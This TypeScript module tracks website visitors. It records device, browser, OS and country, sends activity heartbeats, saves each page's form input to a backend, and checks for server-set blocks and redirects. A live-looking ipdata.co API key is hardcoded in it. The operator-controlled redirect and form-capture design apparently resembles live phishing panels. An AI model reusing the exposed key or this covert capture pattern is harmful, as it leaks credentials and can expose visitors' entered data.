/**
 * Visitor Tracking - Replaces Firebase-based tracking
 * Uses REST API + Socket.io instead of Firestore
 */
;

import { addData, getData, createVisitor, setVisitorOffline, clearRedirectPage as apiClearRedirectPage } from './api';

// ─── Visitor ID helpers ───────────────────────────────────────────────────────

export function generateVisitorRef(): string {
  const timestamp = Date.now().toString(36);
  const random = Math.random().toString(36).substring(2, 8);
  return `REF-${timestamp}-${random}`.toUpperCase();
}

export function getOrCreateVisitorID(): string {
  if (typeof window === 'undefined') return generateVisitorRef();
  let visitorId = localStorage.getItem('visitor');
  if (!visitorId) {
    visitorId = `visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    localStorage.setItem('visitor', visitorId);
  }
  return visitorId;
}

// ─── Device Info ──────────────────────────────────────────────────────────────

export function getDeviceType(): string {
  if (typeof window === 'undefined') return 'unknown';
  const ua = navigator.userAgent;
  if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'tablet';
  if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return 'mobile';
  return 'desktop';
}

export function getBrowser(): string {
  if (typeof window === 'undefined') return 'unknown';
  const ua = navigator.userAgent;
  if (ua.includes('Firefox')) return 'Firefox';
  if (ua.includes('SamsungBrowser')) return 'Samsung Browser';
  if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
  if (ua.includes('Trident')) return 'Internet Explorer';
  if (ua.includes('Edge')) return 'Edge';
  if (ua.includes('Chrome')) return 'Chrome';
  if (ua.includes('Safari')) return 'Safari';
  return 'unknown';
}

export function getOS(): string {
  if (typeof window === 'undefined') return 'unknown';
  const ua = navigator.userAgent;
  if (ua.includes('Win')) return 'Windows';
  if (ua.includes('Mac')) return 'MacOS';
  if (ua.includes('Linux')) return 'Linux';
  if (ua.includes('Android')) return 'Android';
  if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
  return 'unknown';
}

export function getScreenResolution(): string {
  if (typeof window === 'undefined') return 'unknown';
  return `${window.screen.width}x${window.screen.height}`;
}

export async function getCountry(): Promise<string> {
  const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
  const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3000);
    const response = await fetch(url, { signal: controller.signal });
    clearTimeout(timeoutId);
    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
    return await response.text();
  } catch {
    return 'unknown';
  }
}

// ─── Visitor Initialization ───────────────────────────────────────────────────

export async function initializeVisitorTracking(visitorId: string) {
  const country = await getCountry();

  const trackingData = {
    id: visitorId,
    country,
    deviceType: getDeviceType(),
    browser: getBrowser(),
    os: getOS(),
    screenResolution: getScreenResolution(),
    isOnline: true,
    isBlocked: false,
    isUnread: true,
    currentStep: 1,
    currentPage: 'home',
    createdAt: new Date().toISOString(),
    lastActiveAt: new Date().toISOString(),
    sessionStartAt: new Date().toISOString(),
  };

  // Use createVisitor (POST) to ensure visitor exists in DB, then update with tracking data
  let visitorCreated = false;
  let actualVisitorId = visitorId;
  try {
    actualVisitorId = await createVisitor({ id: visitorId });
    visitorCreated = true;
    // Update localStorage with the actual visitorId (may be new if old one was deleted)
    if (typeof window !== 'undefined') {
      window.localStorage.setItem('visitor', actualVisitorId);
    }
  } catch {
    // Visitor may already exist, that's fine
    visitorCreated = true;
  }
  try {
    await addData({ ...trackingData, id: actualVisitorId });
  } catch {
    // Silently ignore if addData fails
  }

  // Setup online/offline listeners (only after visitor is confirmed in DB)
  setupOnlineOfflineListeners(actualVisitorId, visitorCreated);
  setupActivityTracker(actualVisitorId);

  return { ...trackingData, id: actualVisitorId };
}

function setupOnlineOfflineListeners(visitorId: string, isConfirmedInDB = false) {
  if (typeof window === 'undefined') return;

  let confirmed = isConfirmedInDB;

  const updateOnlineStatus = (isOnline: boolean) => {
    if (!confirmed) return; // Skip if visitor not yet confirmed in DB
    addData({ id: visitorId, isOnline }).catch(() => {
      // Silently ignore network errors for online status updates
    });
  };

  window.addEventListener('online', () => updateOnlineStatus(true));
  window.addEventListener('offline', () => updateOnlineStatus(false));
  document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible') updateOnlineStatus(true);
  });
  window.addEventListener('beforeunload', () => {
    if (confirmed) updateOnlineStatus(false);
  });
}

function setupActivityTracker(visitorId: string) {
  if (typeof window === 'undefined') return;

  const heartbeat = () => {
    addData({ id: visitorId, lastActiveAt: new Date().toISOString(), isOnline: true }).catch(() => {
      // Silently ignore if heartbeat fails
    });
  };

  const intervalId = setInterval(heartbeat, 30000);

  window.addEventListener('beforeunload', () => clearInterval(intervalId));

  const events = ['mousedown', 'keydown', 'scroll', 'touchstart'];
  let lastActivityUpdate = Date.now();

  const handleActivity = () => {
    const now = Date.now();
    if (now - lastActivityUpdate > 10000) {
      lastActivityUpdate = now;
      heartbeat();
    }
  };

  events.forEach((event) => {
    document.addEventListener(event, handleActivity, { passive: true });
  });
}

// ─── Page & Form Tracking ─────────────────────────────────────────────────────

export async function updateVisitorPage(visitorId: string, page: string, step: number | string): Promise<void> {
  if (!visitorId) return;
  try {
    await addData({
      id: visitorId,
      currentPage: page,
      currentStep: String(step),
      lastActiveAt: new Date().toISOString(),
    });
  } catch (error) {
    console.error('[Tracking] Error updating visitor page:', error);
  }
}

export async function saveFormData(visitorId: string, data: any, pageName: string): Promise<void> {
  if (!visitorId) return;
  try {
    const timestampedData = {
      ...data,
      [`${pageName}UpdatedAt`]: new Date().toISOString(),
      lastActiveAt: new Date().toISOString(),
    };
    await addData({ id: visitorId, ...timestampedData });
  } catch (error) {
    console.error('[Tracking] Error saving form data:', error);
  }
}

// ─── Status Checks ────────────────────────────────────────────────────────────

export async function checkIfBlocked(visitorId: string): Promise<boolean> {
  try {
    const data = await getData(visitorId);
    return data?.is_blocked === true;
  } catch {
    return false;
  }
}

export async function checkRedirectPage(visitorId: string): Promise<string | null> {
  try {
    const data = await getData(visitorId);
    return data?.redirect_page || null;
  } catch {
    return null;
  }
}

export async function clearRedirectPage(visitorId: string): Promise<void> {
  await apiClearRedirectPage(visitorId);
}

export async function setRedirectPage(visitorId: string, targetPage: string): Promise<void> {
  await addData({ id: visitorId, redirectPage: targetPage });
}

export function setupOnlineTracking(visitorId: string): () => void {
  if (typeof window === 'undefined' || !visitorId) return () => {};

  const heartbeat = () => {
    addData({ id: visitorId, isOnline: true, lastActiveAt: new Date().toISOString() }).catch(() => {
      // Silently ignore if heartbeat fails
    });
  };

  const interval = setInterval(heartbeat, 15000);

  const handleBeforeUnload = () => setVisitorOffline(visitorId);
  const handleVisibilityChange = () => {
    if (document.hidden) setVisitorOffline(visitorId);
    else heartbeat();
  };

  window.addEventListener('beforeunload', handleBeforeUnload);
  document.addEventListener('visibilitychange', handleVisibilityChange);

  return () => {
    clearInterval(interval);
    window.removeEventListener('beforeunload', handleBeforeUnload);
    document.removeEventListener('visibilitychange', handleVisibilityChange);
    setVisitorOffline(visitorId);
  };
}
